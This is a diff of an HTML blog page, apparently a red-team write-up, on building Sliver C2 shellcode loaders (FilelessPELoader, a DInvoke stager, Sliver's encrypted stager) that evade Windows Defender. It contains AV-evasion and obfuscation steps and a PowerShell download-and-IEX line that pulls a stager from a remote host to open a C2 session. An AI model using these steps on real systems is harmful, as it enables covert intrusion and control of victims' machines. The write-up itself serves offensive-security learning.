@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.9.0.802110875010">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.9.0.802637674306">
 
     <!-- See retype.com -->
     <meta name="generator" content="Retype 3.9.0">
@@ -35,12 +35,12 @@
 
     <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>
 
-    <link href="../../resources/css/retype.css?v=3.9.0.802110875010" rel="stylesheet">
+    <link href="../../resources/css/retype.css?v=3.9.0.802637674306" rel="stylesheet">
 
-    <script data-cfasync="false" src="../../resources/js/config.js?v=3.9.0.802110875010" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../resources/js/config.js?v=3.9.0.802637674306" data-turbo-eval="false" defer></script>
     <script data-cfasync="false" src="../../resources/js/retype.js?v=3.9.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" data-cfasync="false" src="../../resources/js/lunr.js?v=3.9.0.802110875010" data-turbo-eval="false" defer></script>
-    <script id="prism-js" data-cfasync="false" src="../../resources/js/prism.js?v=3.9.0.802110875010" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../resources/js/lunr.js?v=3.9.0.802637674306" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../resources/js/prism.js?v=3.9.0.802637674306" defer></script>
 </head>
 <body>
     <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
@@ -199,7 +199,7 @@
         <span>Sliver C2</span>
     </h1>
 </doc-anchor-target>
-<p>My recent exploration into C2 frameworks led me to BishopFox&#x27;s <a href="https://github.com/BishopFox/sliver">Sliver</a> project. While its capabilities are impressive, I quickly encountered a common challenge: Windows Defender&#x27;s swift detection of beacon payloads on my Windows VM. In order to enhance my red teaming skills, I decided to dig into leveraging <a href="https://github.com/Kara-4search/DInvoke_shellcodeload_CSharp/tree/main">DInvoke</a>, <a href="https://github.com/SaadAhla/FilelessPELoader">FilelessPELoader</a> and several evasion techniques for building my own Sliver shellcode loader.</p>
+<p>My recent exploration into C2 frameworks led me to BishopFox&#x27;s <a href="https://github.com/BishopFox/sliver">Sliver</a> project. While its capabilities are impressive, I quickly encountered a common challenge: Windows Defender&#x27;s detection of beacon payloads on my Windows VM. In order to enhance my red teaming skills, I decided to dig into leveraging a custom stager, <a href="https://github.com/Kara-4search/DInvoke_shellcodeload_CSharp/tree/main">DInvoke</a> and <a href="https://github.com/SaadAhla/FilelessPELoader">FilelessPELoader</a>, together with common evasion techniques for building my own Sliver shellcode loader.</p>
 <doc-anchor-target id="what-is-a-shellcode-loader">
     <h2>
         <doc-anchor-trigger class="header-anchor-trigger" to="#what-is-a-shellcode-loader">#</doc-anchor-trigger>
@@ -254,13 +254,13 @@
 [*] Encoding shellcode with shikata ga nai ... success!
 [*] Implant saved to /tmp/rev.bin</code></pre>
 </doc-codeblock></div>
-<p>This command will save the shellcode for our Sliver beacon in <code v-pre>/tmp/rev.bin</code>. If you don&#x27;t want to generate the shellcode within Sliver, we can also generate an executable (default) and use an mTLS listener.</p>
+<p>This command will save the shellcode for our Sliver beacon in <code v-pre>/tmp/rev.bin</code>. If you want to generate an executable (default) that will be executed on the target we can use do this as well. After generating the beacon, we start an mTLS listener.</p>
 <p><figure class="content-center">
     <img src="../../assets/images/maldev/sliver-setup1.png" alt="Generating a Sliver beacon and listener" />
     <figcaption class="caption">Generating a Sliver beacon and listener</figcaption>
 </figure>
 </p>
-<p>In order to better evade detection, we can convert the executable to a <code v-pre>.bin</code> file with <a href="https://github.com/TheWover/donut">Donut</a>. Donut is a tool focused on creating binary shellcodes that can be executed in memory. Its primary strength lies in its ability to convert executables (.exe), dynamic-link libraries (.dll), .NET assemblies, VBScript, and JScript into shellcode. This shellcode can then be injected into a running process, allowing for fileless execution of malicious payloads. I&#x27;ll use Donut with the <code v-pre>-b 1</code> flag to not add AMSI bypass and the <code v-pre>-e 3</code> flag for encryption.</p>
+<p>We can convert the executable to a <code v-pre>.bin</code> file with <a href="https://github.com/TheWover/donut">Donut</a>. Donut is a tool focused on creating binary shellcodes that can be executed in memory. Its primary strength lies in its ability to convert executables (.exe), dynamic-link libraries (.dll), .NET assemblies, VBScript, and JScript into shellcode. This shellcode can then be injected into a running process, allowing for fileless execution of malicious payloads. I&#x27;ll use Donut with the <code v-pre>-b 1</code> flag to not add AMSI bypass and the <code v-pre>-e 3</code> flag for encryption.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-shell-session"><code v-pre class="language-shell-session">$ ./donut -b 1 -e 3 -o rev.bin -i /tmp/ESSENTIAL_THEATER.exe 
 
@@ -278,19 +278,85 @@
   [ Exit          : Thread</code></pre>
 </doc-codeblock></div>
 <p>The idea is that our final stager will grab this binary shellcode file and execute it in memory. There are plenty of existing PE loaders to perform Process Injection into a target process. However, as a learning experience I wanted to create my own loaders.</p>
-<doc-anchor-target id="method-1-dinvoke-stager-net">
+<doc-anchor-target id="method-1-filelesspeloader-c">
     <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#method-1-dinvoke-stager-net">#</doc-anchor-trigger>
-        <span>Method 1: DInvoke Stager (.NET)</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#method-1-filelesspeloader-c">#</doc-anchor-trigger>
+        <span>Method 1: FilelessPELoader (C++)</span>
     </h2>
 </doc-anchor-target>
-<p>Lately, we&#x27;ve seen a growing trend where security tools are being developed in C# or adapted from PowerShell scripts. An advantage of C# is its capability to directly interact with the Windows operating system&#x27;s core functions, known as the Win32 API. This low-level interaction is similar to what&#x27;s possible with C or C++ programs.</p>
-<p>To build our stager, I decided to make use of DInvoke by <a href="https://github.com/TheWover">TheWover</a>. Using DInvoke, we can use Dynamic Invocation to load unmanaged code via DLLs at runtime. The traditional way (using PInvoke) involves the program declaring beforehand which functions it will use, and the operating system helps to link them up. Dynamic Invocation, on the other hand, looks up the address of a function in memory at the exact moment you need it, rather than declaring it beforehand. This makes it harder for analysis since traditional tools will monitor these pre-declared links to see what the program is doing.</p>
+<p><a href="https://github.com/SaadAhla/FilelessPELoader">FilelessPELoader</a> enables the loading and execution of Portable Executable files directly from memory, avoiding disk writes. It also encorporates AES encryption and decryption of the shellcode in memory to further enhance obfuscation.</p>
+<p>In order to evade detection, we will need to make our hands dirty and use manual obfuscation techniques. These include string encryption, control flow obfuscation, instruction substitution, and anti-analysis measures. We can either use <a href="https://github.com/rasta-mouse/ThreatCheck">ThreatCheck</a> or <a href="https://github.com/matterpreter/DefenderCheck">DefenderCheck</a> to see if our executable gets picked up by Anti-Virus.</p>
+<p>Let&#x27;s first clone the project and compile our binary without any modifications.</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/maldev/filelesspeloader-1.png" alt="FilelessPELoader (No obuscation)" />
+    <figcaption class="caption">FilelessPELoader (No obuscation)</figcaption>
+</figure>
+</p>
+<p>From the above output, we can see that ThreatCheck has identified some bad bytes that are detected by our AV. To fix this I removed all comments, any unnecessary print statements or functions, and reversed several function names. I am not going into detail on how to obfuscate the code, since it should be relatively easy to bypass any signature checks.</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/maldev/filelesspeloader-2.png" alt="FilelessPELoader (Ofbuscated)" />
+    <figcaption class="caption">FilelessPELoader (Ofbuscated)</figcaption>
+</figure>
+</p>
+<p>The project comes with a custom <code v-pre>aes.py</code> script that can be used to encrypt any file we want. Running the script will generate two files.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">$ python aes.py 
+Usage: python aes.py PAYLOAD_FILE
+
+$ python aes.py ESSENTIAL_THEATER.exe
+$ ls
+aes.py cipher.bin key.bin ESSENTIAL_THEATER.exe</code></pre>
+</doc-codeblock></div>
+<p>The idea is that our loader will fetch the encrypted binary (<code v-pre>cipher.bin</code>) together with a key (<code v-pre>key.bin</code>) in order to decrypt it. The generated files can be passed to our loader as arguments.</p>
+<doc-anchor-target id="filelesspeloader-execution">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#filelesspeloader-execution">#</doc-anchor-trigger>
+        <span>FilelessPELoader Execution</span>
+    </h3>
+</doc-anchor-target>
+<p>Now we can try running our modified <strong>FilelessPELoader</strong> executable.</p>
+<div class="flex mb-6">
+    <div class="shrink-0 w-1.5 rounded-tl-lg rounded-bl-lg bg-blue-300"></div>
+    <div class="flex w-full py-4 border border-l-0 border-gray-300 rounded-tr-lg rounded-br-lg doc-callout bg-white dark:bg-dark-700 dark:border-dark-700" role="alert">
+        <div class="flex items-center ml-4 h-7">
+            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-blue-300" width="22" height="22" viewBox="0 0 24 24" role="presentation">
+                <g fill="currentColor"><g>
+                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
+                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
+                    <path fill="none" d="M0 0h24v24H0z"></path>
+                </g></g>
+            </svg>
+        </div>
+        <div class="pr-5 ml-3 w-full">
+            <h5>Note</h5>
+<p>Don&#x27;t forget to specify the IP and PORT as well as the encrypted payload and key files as arguments.</p>
+        </div>
+    </div>
+</div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+
+PS C:\&gt; .\FilelessPELoader.exe 192.168.129.40 8080 cipher.bin key.bin</code></pre>
+</doc-codeblock></div>
+<p><figure class="content-center">
+    <img src="../../assets/images/maldev/sliver-filelesspeloader.png" alt="FilelessPELoader Sliver Beacon" />
+    <figcaption class="caption">FilelessPELoader Sliver Beacon</figcaption>
+</figure>
+</p>
+<p>The only problem with this method is that the process will keep on running until it is exited by the user. It also shows up in task manager, which is not very stealthy.</p>
+<doc-anchor-target id="method-2-dinvoke-stager-net">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#method-2-dinvoke-stager-net">#</doc-anchor-trigger>
+        <span>Method 2: DInvoke Stager (.NET)</span>
+    </h2>
+</doc-anchor-target>
+<p>To build a more stealthy stager, I decided to make use of DInvoke by <a href="https://github.com/TheWover">TheWover</a>. Using DInvoke, we can use Dynamic Invocation to load unmanaged code via DLLs at runtime. The traditional way (using PInvoke) involves the program declaring beforehand which functions it will use, and the operating system helps to link them up. Dynamic Invocation, on the other hand, looks up the address of a function in memory at the exact moment you need it, rather than declaring it beforehand. This makes it harder for analysis since traditional tools will monitor these pre-declared links to see what the program is doing.</p>
 <p>DInvoke helps us to avoid API Hooking by calling arbitrary code from memory, while also avoiding detections that look for imports of suspicious API calls via the Import Address Table. For more information about the DInvoke project, be sure to read <a href="https://thewover.github.io/Dynamic-Invoke/">TheWover&#x27;s blog post</a> where he demonstrates how the project works.</p>
 <p>In order to make use of DInvoke as a shellcode loader, I made a few modifications to an existing project of <a href="https://github.com/Kara-4search/DInvoke_shellcodeload_CSharp/tree/main">Kara-4search</a>. I changed the original code in order to download the shellcode from a web server and then load it into memory. The applied changes can be seen below.</p>
 <p><figure class="content-center">
-    <img src="../../assets/images/maldev/dinvoke-loader-1.png" alt="DInvoke Loader" />
-    <figcaption class="caption">DInvoke Loader</figcaption>
+    <img src="../../assets/images/maldev/dinvoke-loader-1.png" alt="DInvoke Loader (adapted)" />
+    <figcaption class="caption">DInvoke Loader (adapted)</figcaption>
 </figure>
 </p>
 <doc-anchor-target id="obfuscation-with-invisibilitycloak">
@@ -299,7 +365,7 @@
         <span>Obfuscation with InvisibilityCloak</span>
     </h3>
 </doc-anchor-target>
-<p>After making those minor adjustments to the shellcode loader, the next step is to make it harder to get detected by traditional Anti-Virus. We can do this by using a technique called code obfuscation. The <a href="https://github.com/h4wkst3r/InvisibilityCloak">InvisibilityCloak</a> provides a user-friendly set of tools to quickly make these kinds of modifications to your project. This toolkit can perform actions such as renaming the project files, changing its unique identifier (GUID), scrambling the text strings within the code, removing any developer comments, and stripping out debugging information stored in program database (PDB) files.</p>
+<p>After making those minor adjustments to the shellcode loader, the next step is to make it harder to get detected by traditional Anti-Virus by doing code obfuscation. The <a href="https://github.com/h4wkst3r/InvisibilityCloak">InvisibilityCloak</a> project provides a user-friendly set of tools to quickly make modifications to your project. This toolkit can perform actions such as renaming the project files, changing its unique identifier (GUID), scrambling the text strings within the code, removing any developer comments, and stripping out debugging information stored in program database (PDB) files.</p>
 <p>Clone the project, compile the binary and run the command below in order to rename the project and apply string reversing as the obfuscation method.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-shell-session"><code v-pre class="language-shell-session">C:\Tools\Python\InvisibilityCloak&gt; python.exe InvisibilityCloak.py -d C:\Tools\DInvoke_Loader\DInvoke_shellcodeload -n &quot;s3rp3nt&quot; -m reverse
@@ -342,13 +408,12 @@ C:\Tools\DInvoke_Loader\DInvoke_shellcodeloadDInvoke_test\Properties\AssemblyInf
 
 [+] SUCCESS: Your new tool s3rp3nt now has the invisibility cloak applied.</code></pre>
 </doc-codeblock></div>
-<p>From the output we see that we have succesfully obfuscated the project. Before compiling, let&#x27;s change all string references to DInvoke to another custom string (e.g. &quot;s3rp3nt&quot;). We will also change the project output type to be a Windows Application in order to avoid a console pop-up when executing the binary.</p>
+<p>From the output we see that we have succesfully obfuscated the project. Before compiling, let&#x27;s change all string references of DInvoke to another custom string (e.g. &quot;s3rp3nt&quot;). We will also change the project output type to be a Windows Application in order to avoid a console pop-up when executing the binary.</p>
 <p><figure class="content-center">
     <img src="../../assets/images/maldev/dinvoke-loader-2.png" alt="DInvoke loader" />
     <figcaption class="caption">DInvoke loader</figcaption>
 </figure>
 </p>
-<p>We can now compile the project to x64 architecture in release mode by going to <code v-pre>Build &gt; Build Solution</code>.</p>
 <doc-anchor-target id="av-check">
     <h3>
         <doc-anchor-trigger class="header-anchor-trigger" to="#av-check">#</doc-anchor-trigger>
@@ -372,86 +437,20 @@ C:\Tools\ThreatCheck\bin\Release&gt; ThreatCheck.exe -f C:\Tools\s3rp3ntLoader.e
         <span>DInvoke Execution</span>
     </h3>
 </doc-anchor-target>
-<p>Now with everything set lets try to get a beacon from our victim machine (<code v-pre>172.16.0.5</code>). We will first make use of our <strong>DInvoke Loader</strong>.</p>
+<p>Now with everything set lets try to get a beacon from our victim machine. First convert the beacon executable to binary shellcode format if you haven&#x27;t already (see Donut example above).</p>
 <p><figure class="content-center">
     <img src="../../assets/images/maldev/sliver-execution.png" alt="Sliver DInvoke Loader" />
     <figcaption class="caption">Sliver DInvoke Loader</figcaption>
 </figure>
 </p>
 <p>After executing our custom shellcode loader, we can see it has grabbed our beacon file from our Python server (<code v-pre>rev.bin</code>), loaded the shellcode in memory and connected to our server without alerting Windows Defender. You see that I get a couple of beacon connections, because I ran the executable a couple of times.</p>
-<p>No threats have been found! Our first loader looks good to go.</p>
-<doc-anchor-target id="method-2-filelesspeloader-c">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#method-2-filelesspeloader-c">#</doc-anchor-trigger>
-        <span>Method 2: FilelessPELoader (C++)</span>
-    </h2>
-</doc-anchor-target>
-<p>DInvoke, while powerful for direct system calls, requires the .NET Common Language Runtime (CLR) to be present on the system, increasing dependencies and potentially raising detection flags. This .NET dependency also necessitates writing loaders in C# or bridging the language gap if your main payload is in another language.</p>
-<p>Switching to native code, like C++, eliminates the .NET dependency, resulting in a smaller footprint and potentially different evasion characteristics. <a href="https://github.com/SaadAhla/FilelessPELoader">FilelessPELoader</a> exemplifies this approach by enabling the loading and execution of PE files directly from memory, avoiding disk writes, while encrypting the shellcode in memory further enhances obfuscation.</p>
-<p>In order to do all this, we cannot make use of InvisibilityCloak as we did earlier. We will need to make our hands dirty and use manual techniques. These include string encryption, control flow obfuscation, instruction substitution, and anti-analysis measures. Again we can use either DefenderCheck or ThreatCheck to see if our executable would get picked up by AV.</p>
-<p>Let&#x27;s first clone the project and compile our binary without any modifications.</p>
-<p><figure class="content-center">
-    <img src="../../assets/images/maldev/filelesspeloader-1.png" alt="FilelessPELoader" />
-    <figcaption class="caption">FilelessPELoader</figcaption>
-</figure>
-</p>
-<p>From the above output, we can see that ThreatCheck has identified some bad bytes that will be detected by AV. To fix this I removed all comments, any unnecessary print statements or functions, and reversed several function names. I am not going into detail on how to obfuscate the code, since it should be relatively easy to bypass any signature checks.</p>
-<p><figure class="content-center">
-    <img src="../../assets/images/maldev/filelesspeloader-2.png" alt="FilelessPELoader" />
-    <figcaption class="caption">FilelessPELoader</figcaption>
-</figure>
-</p>
-<p>The project comes with a custom <code v-pre>aes.py</code> script that can be used to encrypt any file we want. The idea is that our loader will fetch the encrypted binary (<code v-pre>cipher.bin</code>) together with a key (<code v-pre>key.bin</code>) in order to decrypt it.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">$ python3 aes.py ESSENTIAL_THEATER.exe
-$ ls
-aes.py cipher.bin key.bin ESSENTIAL_THEATER.exe</code></pre>
-</doc-codeblock></div>
-<p>The generated files <code v-pre>cipher.bin</code> and <code v-pre>key.bin</code> can be passed to our loader as arguments. In the next section we will have a look at how we can make use of our loaders.</p>
-<doc-anchor-target id="filelesspeloader-execution">
-    <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#filelesspeloader-execution">#</doc-anchor-trigger>
-        <span>FilelessPELoader Execution</span>
-    </h3>
-</doc-anchor-target>
-<p>Now we can also try running our modified <strong>FilelessPELoader</strong> executable.</p>
-<div class="flex mb-6">
-    <div class="shrink-0 w-1.5 rounded-tl-lg rounded-bl-lg bg-blue-300"></div>
-    <div class="flex w-full py-4 border border-l-0 border-gray-300 rounded-tr-lg rounded-br-lg doc-callout bg-white dark:bg-dark-700 dark:border-dark-700" role="alert">
-        <div class="flex items-center ml-4 h-7">
-            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-blue-300" width="22" height="22" viewBox="0 0 24 24" role="presentation">
-                <g fill="currentColor"><g>
-                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
-                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
-                    <path fill="none" d="M0 0h24v24H0z"></path>
-                </g></g>
-            </svg>
-        </div>
-        <div class="pr-5 ml-3 w-full">
-            <h5>Note</h5>
-<p>Don&#x27;t forget to specify the IP and PORT as well as the encrypted payload and key files as arguments.</p>
-        </div>
-    </div>
-</div>
-<div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-shell-session"><code v-pre class="language-shell-session">$ python3 aes.py beacon.exe
-$ python3 -m http.server 8080
-Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
-
-PS C:\&gt; .\FilelessPELoader.exe 192.168.129.40 8080 cipher.bin key.bin</code></pre>
-</doc-codeblock></div>
-<p><figure class="content-center">
-    <img src="../../assets/images/maldev/sliver-filelesspeloader.png" alt="Sliver FilelessPELoader" />
-    <figcaption class="caption">Sliver FilelessPELoader</figcaption>
-</figure>
-</p>
 <doc-anchor-target id="method-3-custom-encrypted-stager">
     <h2>
         <doc-anchor-trigger class="header-anchor-trigger" to="#method-3-custom-encrypted-stager">#</doc-anchor-trigger>
         <span>Method 3: Custom Encrypted Stager</span>
     </h2>
 </doc-anchor-target>
-<p>Sliver has built-in support for custom stagers making use of encryption and compression when serving stages. First we need to setup our profile, listener, and stage listener with the following command:</p>
+<p>Now Sliver has actually built-in support for custom stagers making use of encryption and compression when serving stages. First we need to setup our profile, listener, and stage listener with the following command:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-shell-session"><code v-pre class="language-shell-session">$ sudo ./sliver-server_linux
 [server] sliver &gt; profiles new -b https://192.168.129.40:443 --skip-symbols --format shellcode --arch amd64 s3rp3nt
@@ -522,7 +521,7 @@ $CompressionAlgorithm = &quot;deflate9&quot;
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre class="language-powershell"><code v-pre class="language-powershell">PS C:\&gt; (New-Object System.Net.WebClient).DownloadString('http://192.168.129.40/README.md') | IEX</code></pre>
 </doc-codeblock></div>
-<p>In a minute we should get a session in Sliver with Defender stopping us.</p>
+<p>In a minute we should get a session in Sliver without Defender stopping us.</p>
 <p><figure class="content-center">
     <img src="../../assets/images/maldev/sliver-session.png" alt="Sliver Session" />
     <figcaption class="caption">Sliver Session</figcaption>
